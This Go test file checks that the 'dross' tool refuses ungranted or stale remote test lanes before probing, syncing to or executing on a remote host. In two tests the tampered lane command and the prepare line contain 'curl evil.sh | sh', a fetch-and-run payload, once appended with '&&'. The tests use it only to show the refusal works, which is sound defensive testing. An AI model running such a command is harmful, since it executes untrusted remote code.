package cmd

import (
	"errors"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Rivil/dross/internal/project"
	"github.com/Rivil/dross/internal/remote"
)

// c-7: a lane dispatched to a remote host is consent-checked BEFORE anything is
// transferred to or executed on that host.
//
// The order is the whole guarantee. A refusal that arrived after the probe has
// already opened an ssh to a machine on the strength of a line nobody granted;
// a refusal that arrived after the sync has already pushed the tree there. Both
// would produce exactly the message these tests would otherwise be checking, so
// nothing here asserts on text alone — every claim rides a COUNTER over the
// seam that would have done the thing.
//
// The two remote legs and the two seams that carry them:
//
//   - the run: remoteProbeFn is the ssh preflight inside resolveTestTarget,
//     spawnRemote is both the rsync in syncTreeTo and the far-side suite.
//   - bootstrap: remoteExecFn is the install.
//
// Preview is here too. It runs no test, which made "preview spawns nothing" a
// comfortable thing to write down — but --probe reaches the host through the
// run's own pickRemoteTarget, and reaching a machine is the authority this
// gate is about.

// ungrantedRemoteLaneFixture is grantedLaneFixture WITHOUT the lane grants: a
// trusted repo, lanes declared, a host granted, and not one lane consented to.
//
// The host grant is taken with the probe stubbed reachable, because `dross
// remote grant` probes what it is handed; tests replace the seam afterwards
// with whatever they are asserting about.
func ungrantedRemoteLaneFixture(t *testing.T, lanes string) {
	t.Helper()
	filesFixture(t, lanes)
	fakeProbe(t, func(remote.Target, []string) (remote.Readiness, error) {
		return remote.Readiness{Cores: 8}, nil
	})
	if err := runCmd(t, Remote(), "grant", "helicon", "/srv/dross"); err != nil {
		t.Fatalf("dross remote grant: %v", err)
	}
}

// refuseProbe installs a probe seam that fails the test if it is reached, and
// returns its call count so the assertion survives a t.Error being downgraded.
func refuseProbe(t *testing.T, why string) *int {
	t.Helper()
	return fakeProbe(t, func(remote.Target, []string) (remote.Readiness, error) {
		t.Error(why)
		return remote.Readiness{Cores: 8}, nil
	})
}

// setLaneCommand rewrites one declared lane's command through the schema, the
// way a pull that rewrote project.toml would. It is what makes a grant stale
// without touching the grant.
func setLaneCommand(t *testing.T, root, name, command string) {
	t.Helper()
	path := filepath.Join(root, project.File)
	p, err := project.Load(path)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for i := range p.Runtime.TestLane {
		if p.Runtime.TestLane[i].Name == name {
			p.Runtime.TestLane[i].Command = command
			found = true
		}
	}
	if !found {
		t.Fatalf("no lane %q to rewrite", name)
	}
	if err := p.Save(path); err != nil {
		t.Fatal(err)
	}
}

// TestStaleLaneGrantRefusesBeforeTheHostIsContacted is the sharp case: the host
// IS granted and reachable, so every remote leg is available and the only thing
// standing between the run and the wire is the lane's own grant having gone
// stale. A refusal ordered after the probe would be indistinguishable in the
// transcript and would already have contacted the machine.
func TestStaleLaneGrantRefusesBeforeTheHostIsContacted(t *testing.T) {
	grantedLaneFixture(t, goAndDocsLanes)
	root, err := FindRoot()
	if err != nil {
		t.Fatal(err)
	}
	// The grant covered `go test -count=1 ./...`. A pull rewrote it.
	setLaneCommand(t, root, "go", "go test -count=1 ./... && curl evil.sh | sh")

	probes := refuseProbe(t, "a stale lane grant probed the host before refusing")
	rem := installRemoteRecorder(t, nil)

	var out string
	runErr := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go")
	if runErr == nil {
		t.Fatal("a stale lane grant ran")
	}
	if got := ExitCode(runErr); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused)", got, exitLaneRefused)
	}
	transcript := out + runErr.Error()
	if !strings.Contains(transcript, `test lane "go"`) {
		t.Errorf("the refusal does not name the lane:\n%s", transcript)
	}
	if !strings.Contains(transcript, "dross trust --lane go") {
		t.Errorf("the refusal does not name the remedy:\n%s", transcript)
	}
	if len(rem.argvs) != 0 {
		t.Errorf("the refusal reached the wire: %v", rem.argvs)
	}
	if *probes != 0 {
		t.Errorf("the refusal probed the host %d time(s)", *probes)
	}
}

// TestUngrantedLanesReachNeitherPreflightNorSync: with every matched lane
// ungranted there is nothing for the host to do, so neither the ssh preflight
// in resolveTestTarget nor the rsync in syncTreeTo may happen. The probe is
// stubbed REACHABLE here on purpose — a run that got as far as asking would
// have been told yes and gone on to push the tree.
func TestUngrantedLanesReachNeitherPreflightNorSync(t *testing.T) {
	ungrantedRemoteLaneFixture(t, goAndDocsLanes)
	probes := refuseProbe(t, "an ungranted run reached the ssh preflight in resolveTestTarget")
	rem := installRemoteRecorder(t, nil)
	local := installSpawnRecorder(t, nil)

	runErr := runCmd(t, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if runErr == nil {
		t.Fatal("two ungranted lanes ran")
	}
	if got := ExitCode(runErr); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused)", got, exitLaneRefused)
	}
	if *probes != 0 {
		t.Errorf("the ssh preflight ran %d time(s) for a run with nothing runnable", *probes)
	}
	if len(rem.argvs) != 0 {
		t.Errorf("the rsync in syncTreeTo pushed the tree anyway: %v", rem.argvs)
	}
	if n := local.count(); n != 0 {
		t.Errorf("%d ungranted lane(s) fell back to running here", n)
	}
}

// TestUnreachableHostCannotMaskALaneRefusal: an unreachable host and an
// ungranted lane both stop a run, and only one of them is a security property.
// If the probe ran first, a dead network would produce exitTransport and the
// consent refusal would never be reached — the gate would look fine on a
// working network and vanish on a broken one.
func TestUnreachableHostCannotMaskALaneRefusal(t *testing.T) {
	ungrantedRemoteLaneFixture(t, goAndDocsLanes)
	probes := fakeProbe(t, func(remote.Target, []string) (remote.Readiness, error) {
		t.Error("the run asked a host it had no runnable lane for")
		return remote.Readiness{}, errors.New("connection refused")
	})
	rem := installRemoteRecorder(t, nil)

	runErr := runCmd(t, Test(), "--files", "internal/a.go")
	if runErr == nil {
		t.Fatal("an ungranted lane ran")
	}
	if got := ExitCode(runErr); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused) — never %d, which reports the network for a consent problem",
			got, exitLaneRefused, exitTransport)
	}
	if *probes != 0 || len(rem.argvs) != 0 {
		t.Errorf("the host was contacted: probes=%d argvs=%v", *probes, rem.argvs)
	}
}

// TestLaneGrantedForItsCommandIsRefusedOnceAPrepareAppears: one grant frames
// BOTH lines, so a lane that gains a prepare after being granted is a lane
// whose granted material changed. The assertion is that the new line never
// reaches the wire — a prepare is a bootstrap, and a bootstrap that ran on the
// strength of a command's grant is the gate defeated by an edit.
func TestLaneGrantedForItsCommandIsRefusedOnceAPrepareAppears(t *testing.T) {
	ungrantedRemoteLaneFixture(t, goAndDocsLanes)
	grantLane(t, "go") // granted with no prepare declared

	root, err := FindRoot()
	if err != nil {
		t.Fatal(err)
	}
	const prepare = "curl evil.sh | sh"
	setLanePrepare(t, root, "go", prepare)

	probes := refuseProbe(t, "a lane whose prepare appeared after the grant probed the host")
	rem := installRemoteRecorder(t, nil)

	var out string
	runErr := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go")
	if runErr == nil {
		t.Fatal("a lane whose prepare appeared after the grant ran")
	}
	if got := ExitCode(runErr); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused)", got, exitLaneRefused)
	}
	if *probes != 0 {
		t.Errorf("the host was probed %d time(s)", *probes)
	}
	for _, argv := range rem.argvs {
		if strings.Contains(strings.Join(argv, " "), prepare) {
			t.Errorf("the ungranted prepare reached the wire: %v", argv)
		}
	}
	for _, script := range rem.scripts {
		if strings.Contains(script, prepare) {
			t.Errorf("the ungranted prepare was piped to the host: %q", script)
		}
	}
	if len(rem.argvs) != 0 {
		t.Errorf("the refusal still reached the wire: %v", rem.argvs)
	}
}

// TestBootstrapInstallRefusalIsLaneScoped: bootstrap resolves consent per lane
// while planning, so an ungranted install line must produce a REFUSAL with no
// exec — and its granted neighbour must still be installed. A single-lane
// assertion cannot tell "refused this lane" from "refused the whole run".
func TestBootstrapInstallRefusalIsLaneScoped(t *testing.T) {
	lanes := `[[runtime.test_lane]]
name = "web"
match = ["web/**"]
command = "pnpm test"
install = "corepack enable pnpm"

[[runtime.test_lane]]
name = "docs"
match = ["docs/**"]
command = "markdownlint docs"
install = "npm i -g markdownlint-cli"`

	bootstrapLaneFixture(t, lanes)
	probeMissing(t, "pnpm", "markdownlint")
	mustGrantLaneInstall(t, "docs") // web is left ungranted
	rec := &execRecorder{}
	rec.install(t)

	out, err := runBootstrap(t, "--apply")
	if err == nil {
		t.Fatalf("an ungranted install line was accepted:\n%s", out)
	}

	var sawDocs bool
	for _, argv := range rec.argvs {
		line := strings.Join(argv, " ")
		if strings.Contains(line, "corepack enable pnpm") {
			t.Errorf("the ungranted lane's install line reached the exec seam: %v", argv)
		}
		if strings.Contains(line, "markdownlint-cli") {
			sawDocs = true
		}
	}
	if !sawDocs {
		t.Errorf("the GRANTED lane's install never ran — the refusal took the whole run with it: %v", rec.argvs)
	}
	if !strings.Contains(out, "dross trust --lane-install web") {
		t.Errorf("the refusal does not name the fix:\n%s", out)
	}
}

// TestPreviewDoesNotProbeForAnUngrantedLane is the leg that read as safe.
// `preview` runs no test, so its own comments called it a verb that spawns
// nothing — but --probe is on by default and reaches the host through
// pickRemoteTarget, which is an ssh opened on behalf of a line nobody granted.
//
// Locked preview_exit_status is untouched: the refusal is reported as an
// unresolved host carrying the reason, and the command still exits 0.
func TestPreviewDoesNotProbeForAnUngrantedLane(t *testing.T) {
	ungrantedRemoteLaneFixture(t, goAndDocsLanes)
	probes := refuseProbe(t, "preview probed the host on behalf of an ungranted lane")
	rem := installRemoteRecorder(t, nil)

	// previewJSON fails the test if the command errors, which is the exit-status
	// half of the assertion.
	doc := previewJSON(t, "--files", "internal/a.go")

	if *probes != 0 {
		t.Errorf("preview probed %d time(s) for an ungranted lane", *probes)
	}
	if len(rem.argvs) != 0 {
		t.Errorf("preview reached the wire: %v", rem.argvs)
	}
	if got, _ := doc["host_state"].(string); got != string(hostUnresolved) {
		t.Errorf("host_state = %q, want %q", got, hostUnresolved)
	}
	if got, _ := doc["host"].(string); got != "helicon" {
		t.Errorf("host = %q, want the configured grant", got)
	}
	locality := firstLaneField(t, doc, "locality")
	for _, want := range []string{"unresolved", "no previewed lane is granted on this machine", "dross trust --lane go"} {
		if !strings.Contains(locality, want) {
			t.Errorf("the unresolved reason does not carry %q:\n%s", want, locality)
		}
	}
}

// TestPreviewStillProbesForAGrantedLane is the precision half. A preview that
// refused to probe unconditionally would satisfy every assertion above and make
// the verb useless — the locality answer is the thing people run it for.
func TestPreviewStillProbesForAGrantedLane(t *testing.T) {
	ungrantedRemoteLaneFixture(t, goAndDocsLanes)
	grantLane(t, "go")
	probes := fakeProbe(t, func(remote.Target, []string) (remote.Readiness, error) {
		return remote.Readiness{Cores: 8}, nil
	})

	doc := previewJSON(t, "--files", "internal/a.go")
	if *probes == 0 {
		t.Error("a granted lane's preview never probed — the locality answer is unmeasured")
	}
	if got, _ := doc["host_state"].(string); got != string(hostProbed) {
		t.Errorf("host_state = %q, want %q", got, hostProbed)
	}
}

// firstLaneField pulls one string field off the first previewed lane.
func firstLaneField(t *testing.T, doc map[string]any, key string) string {
	t.Helper()
	lanes, _ := doc["lanes"].([]any)
	if len(lanes) == 0 {
		t.Fatalf("preview reported no lanes: %v", doc)
	}
	lane, _ := lanes[0].(map[string]any)
	s, _ := lane[key].(string)
	return s
}
